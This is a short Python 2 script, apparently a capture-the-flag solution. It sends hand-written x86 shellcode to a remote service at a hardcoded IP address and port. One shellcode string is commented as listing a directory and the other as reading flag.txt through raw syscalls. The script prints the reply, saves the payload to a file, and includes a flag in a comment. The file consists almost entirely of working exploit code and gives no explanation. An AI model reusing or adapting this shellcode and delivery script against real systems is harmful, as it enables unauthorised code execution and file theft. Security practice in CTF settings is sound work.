import socket

#flag{thank_you_bfox}

#list dir
sh1=("\xeb\x45\x31\xc0\x31\xff\x47\x47\x47\x47\x01\xf8\x40\x5b\x31\xc9\x31\xd2\xcd\x80"
        "\x85\xc0\x74\x28\x89\xc3\x31\xd2\x83\xc2\x01\xc1\xe2\x08\x29\xd4\x89\xe1\x31\xc0"
        "\x83\xc0\x01\xc1\xe0\x07\x83\xc0\x0d\xcd\x80\x89\xc2\x89\xe1\x31\xdb\x80\xc3\x01"
        "\x89\xf8\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xb6\xff\xff\xff\x2e")

#read file
sh2=("\x31\xc0\x04\x05\x31\xc9\x51\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe3\xcd\x80"
        "\x31\xdb\x80\xc3\xff\x29\xdc\x8d\x0c\x24\x89\xc3\x31\xc0\x04\x03"
        "\x31\xd2\x80\xc2\xff\xcd\x80\x89\xc2\x31\xc0\x04\x04\x31\xdb\x80"  
        "\xc3\x01\xcd\x80\x31\xc0\x89\xc3\x04\x01\xcd\x80")

payload = sh2+'\n'

#s=socket.create_connection(('127.0.0.1',4444)) #it works locally, why not on remote ?
s=socket.create_connection(('212.71.235.214',4000))
s.send(payload)
print s.recv(1024)

open('payload','w').write(payload)

